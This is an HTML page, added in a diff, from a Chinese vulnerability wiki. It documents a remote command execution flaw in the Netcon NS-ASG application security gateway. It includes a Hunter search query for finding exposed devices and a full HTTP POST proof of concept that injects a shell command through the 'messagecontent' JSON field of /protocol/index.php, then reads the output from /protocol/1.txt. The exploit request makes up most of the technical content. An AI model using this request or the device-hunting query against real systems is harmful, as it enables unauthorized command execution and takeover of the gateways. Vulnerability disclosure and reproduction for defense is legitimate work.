@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%BD%91%E5%BA%B7/%E7%BD%91%E5%BA%B7NS-ASG%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E7%BD%91%E5%BA%B7NS-ASG%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>网康 NS-ASG应用安全网关存在远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7f51\u5eb7 NS-ASG\u5e94\u7528\u5b89\u5168\u7f51\u5173\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%BD%91%E5%BA%B7NS-ASG%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%BD%91%E5%BA%B7NS-ASG%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        网康NS-ASG应用安全网关源代码泄露漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../../%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0/%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../../%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0/%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        网动统一通信平台存在默认口令漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="ns-asg">网康 NS-ASG应用安全网关存在远程命令执行漏洞<a class="headerlink" href="#ns-asg" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>网康科技有限公司是中国技术领先的网络应用管理设备提供商，专注于网络应用管理领域最前沿的趋势研究和分析，为用户提供先进的网络应用管理技术、产品与解决方案，旨在帮助用户实现“上好网 用好网”的网络管理目标。网康应用安全网关系统存在远程命令执行漏洞，攻击者通过漏洞可以执行任意命令，导致服务器失陷。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>网康应用安全网关系统</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>hunter<code>web.title=="网康 NS-ASG 应用安全网关"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1700039945096-d99e24a4-9e98-4951-b4bf-3ec53154e6be.png" src="./img/Q3wbZCP7nLEzpjt6/1700039945096-d99e24a4-9e98-4951-b4bf-3ec53154e6be-739231.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<ol>
+<li>执行如下执行POC语句，同时执行id命令并写入/protocol/1.txt。</li>
+</ol>
+<div class="highlight"><pre><span></span><code>POST /protocol/index.php HTTP/1.1
+Host: xx.xx.xx.xx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+
+jsoncontent={&quot;protocolType&quot;:&quot;getsysdatetime&quot;,&quot;messagecontent&quot;:&quot;1;id&gt;1.txt;&quot;}
+</code></pre></div>
+<p><img alt="1700040012683-b9714aa9-b738-429c-8700-a475eff2249d.png" src="./img/Q3wbZCP7nLEzpjt6/1700040012683-b9714aa9-b738-429c-8700-a475eff2249d-740368.png" /></p>
+<ol>
+<li>访问<code>/protocol/1.txt</code>路径，获取命令执行结果。</li>
+</ol>
+<div class="highlight"><pre><span></span><code>/protocol/1.txt
+</code></pre></div>
+<p><img alt="1700040060126-ae08016a-0a0f-4e4c-9821-38261430e5ce.png" src="./img/Q3wbZCP7nLEzpjt6/1700040060126-ae08016a-0a0f-4e4c-9821-38261430e5ce-691820.png" /></p>
+<blockquote>
+<p>更新: 2024-02-29 23:57:15<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/zut666gci4d1s4sv">https://www.yuque.com/xiaokp7/ocvun2/zut666gci4d1s4sv</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%BD%91%E5%BA%B7NS-ASG%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%BD%91%E5%BA%B7NS-ASG%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        网康NS-ASG应用安全网关源代码泄露漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../../%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0/%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../../%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0/%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        网动统一通信平台存在默认口令漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
